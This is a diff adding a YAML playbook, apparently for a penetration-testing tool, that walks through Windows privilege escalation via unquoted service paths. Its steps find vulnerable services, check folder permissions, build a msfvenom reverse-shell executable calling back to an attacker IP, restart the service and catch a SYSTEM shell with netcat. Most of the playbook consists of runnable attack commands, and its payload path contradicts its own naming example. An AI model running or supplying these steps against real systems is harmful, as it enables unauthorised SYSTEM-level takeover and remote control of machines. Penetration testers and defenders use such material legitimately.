@@ -1,0 +1,61 @@
+id: unquoted-service-path
+name: "Windows PE — unquoted service path → SYSTEM"
+description: >
+  A service whose binPath contains spaces but isn't quoted is exploitable
+  when any intermediate directory is writable. Windows tries each prefix
+  in turn (`C:\Program Files\App\bin.exe` → try `C:\Program.exe`,
+  `C:\Program Files\App.exe`, etc.). Drop a malicious `.exe` and restart.
+tags: [windows, priv-esc, services, classic-windows]
+difficulty: easy
+
+inputs: []
+
+steps:
+  - id: find_unquoted
+    name: "Find unquoted service paths"
+    inline_command: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\" | findstr /i /v \"\\\"\""
+    notes: |
+      Only services in AUTO start (or that you can restart) matter. The
+      grep filters out the protected windows\\ paths and any path already
+      quoted.
+
+  - id: check_writable
+    name: "Check writability of each intermediate directory"
+    inline_command: "icacls \"C:\\Program Files\\Vulnerable Folder\""
+    notes: |
+      Look for `(F)` (full) or `(M)` (modify) on Users / Authenticated
+      Users / BUILTIN\\Users / the current account. Repeat per directory
+      level in the path until you find one you can write.
+
+  - id: stage_payload
+    name: "Stage your payload as Program.exe / Service.exe etc."
+    inline_command: |
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o "C:\\Program Files\\Vulnerable\\Program.exe"
+    inputs:
+      lhost: "${attacker_ip}"
+      lport: "4444"
+    notes: |
+      The name must match the intermediate prefix. Example for path
+      `C:\Program Files\Vulnerable Folder\App\bin.exe` with `Vulnerable Folder`
+      writable, drop `Vulnerable.exe` inside `C:\Program Files\`.
+
+  - id: trigger
+    name: "Restart the service (or wait for the next boot)"
+    inline_command: "sc stop <ServiceName>; sc start <ServiceName>"
+    notes: |
+      If you can't restart it, use shutdown -r -t 0 / wait for cron-like
+      restart, or pick a service that runs on user logon.
+
+  - id: catch_shell
+    name: "Catch the SYSTEM reverse shell"
+    inline_command: "nc -lvnp <lport>"
+    inputs:
+      lport: "4444"
+    notes: |
+      Use rlwrap nc for line editing. Stabilize the shell with
+      `python -c 'import pty;pty.spawn(\"/bin/sh\")'` (n/a on Windows — use
+      Powershell's Invoke-PowerShellTcp).
+
+references:
+  - title: "HackTricks — Unquoted Service Path"
+    url:   "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#unquoted-service-paths"
